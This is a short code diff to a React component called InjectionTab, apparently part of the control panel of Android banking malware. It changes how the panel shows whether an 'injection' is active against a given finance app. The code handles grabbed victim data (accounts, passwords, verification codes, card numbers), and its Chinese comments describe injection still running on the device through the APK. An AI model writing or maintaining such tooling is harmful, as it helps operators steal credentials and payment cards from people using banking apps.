@@ -430,7 +430,9 @@ export default function InjectionTab({
                 const gData = parseGrabbedData ? parseGrabbedData(grabbed?.data) : {}
                 const hasData = !!(gData.account || gData.password || gData.verification || gData.card)
                 // 自动注入开关只表示功能已启用；实际运行态以活跃任务为准。
-                const isActive = hasData ? false : (injActivePkgs.has(packageName) || injActiveIds.has(tpl.id || tpl.templateId || tpl.template_id))
+                // 历史采集数据不等于当前任务已停止。当 APK/DB 确认仍在注入时，
+                // 即使有旧数据也要显示“停止注入”。
+                const isActive = injActivePkgs.has(packageName) || injActiveIds.has(tpl.id || tpl.templateId || tpl.template_id)
                 const isLoading = injLoadingPkg === packageName
                 const isInjecting = isActive || isLoading
                 const category = getFinanceCategory(packageName, appName)
